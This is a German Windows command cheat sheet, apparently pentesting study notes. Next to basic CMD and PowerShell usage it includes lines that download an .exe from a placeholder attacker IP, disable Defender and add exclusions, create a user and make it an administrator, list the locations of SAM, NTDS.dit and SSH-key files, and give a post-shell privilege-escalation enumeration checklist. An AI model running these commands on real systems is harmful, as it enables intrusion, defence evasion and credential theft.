# Windows Basics

## CMD Grundbefehle

```cmd
whoami                        # aktueller User
whoami /all                   # User + Gruppen + Privileges
hostname                      # Rechnername
systeminfo                    # System-Informationen (OS, Patches, RAM)
dir                           # Verzeichnis anzeigen
dir /a                        # auch versteckte Dateien
cd C:\Pfad                    # Verzeichnis wechseln
cd ..                         # zurück
mkdir ordner                  # Ordner erstellen
del datei.txt                 # Datei löschen
copy quelle ziel              # kopieren
move quelle ziel              # verschieben
type datei.txt                # Datei ausgeben (wie cat)
find "suchbegriff" datei.txt  # in Datei suchen
cls                           # Bildschirm leeren
```

## Benutzer & Gruppen

```cmd
net user                              # alle lokalen User
net user username                     # Details zu User
net user username passwort /add       # User hinzufügen
net localgroup                        # alle Gruppen
net localgroup administrators         # Admins anzeigen
net localgroup administrators username /add   # zu Admin hinzufügen
net session                           # aktive Sessions
```

## Prozesse & Services

```cmd
tasklist                              # alle Prozesse
tasklist | findstr "process"          # Prozess suchen
taskkill /PID 1234 /F                 # Prozess beenden
sc query                              # alle Services
sc query spooler                      # spezifischer Service
sc start servicename                  # Service starten
sc stop servicename                   # Service stoppen
sc qc servicename                     # Service Konfiguration
# → zeigt BINARY_PATH_NAME (unquoted paths prüfen!)

# Geplante Tasks
schtasks /query /fo LIST /v           # alle Tasks anzeigen
# Auf "Run As User: SYSTEM" und beschreibbare Scripts achten!
```

## Registry

```cmd
reg query HKLM\SOFTWARE\...           # Registry-Schlüssel lesen
reg add "HKLM\Key" /v Name /t REG_DWORD /d 1 /f   # Wert setzen

# AlwaysInstallElevated prüfen (beide müssen 1 sein → vulnerable)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## PowerShell Grundbefehle

```powershell
Get-ChildItem                         # ls / dir
Get-ChildItem -Hidden                 # versteckte Dateien
Set-Location C:\Pfad                  # cd
New-Item -ItemType Directory -Name ordner   # mkdir
Get-Content datei.txt                 # type / cat
Select-String "suchbegriff" datei.txt # grep
Get-Process                           # tasklist
Stop-Process -Id 1234                 # taskkill
Get-Service                           # sc query
Start-Service servicename             # sc start
Stop-Service servicename              # sc stop
Get-NetIPAddress                      # IP-Adressen
Get-NetTCPConnection                  # Verbindungen

# Datei herunterladen
Invoke-WebRequest -Uri "http://<ip>/datei.exe" -OutFile "C:\Temp\datei.exe"
(New-Object Net.WebClient).DownloadFile("http://<ip>/datei.exe", "C:\Temp\datei.exe")

# Defender deaktivieren
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionExtension ".exe"
Get-MpComputerStatus | Select RealTimeProtectionEnabled   # Status prüfen
```

## Wichtige Pfade

```
C:\Windows\System32\config\SAM       → Passwort-Hashes
C:\Windows\System32\config\SYSTEM    → Encryption Key für SAM
C:\Windows\NTDS\NTDS.dit             → Active Directory Hashes (DC)
C:\Users\<user>\AppData\Roaming\     → User App-Daten
C:\Users\<user>\.ssh\                → SSH Keys
C:\Windows\Temp\                     → Temp (oft beschreibbar)
C:\Temp\                             → Alternative Temp
C:\ProgramData\                      → Programme Daten
```

## Basis-Enumeration nach Shell

```cmd
whoami
whoami /all
systeminfo
net user
net localgroup administrators
ipconfig /all
netstat -ano
tasklist
schtasks /query /fo LIST /v
sc query
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
wmic product get name
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```
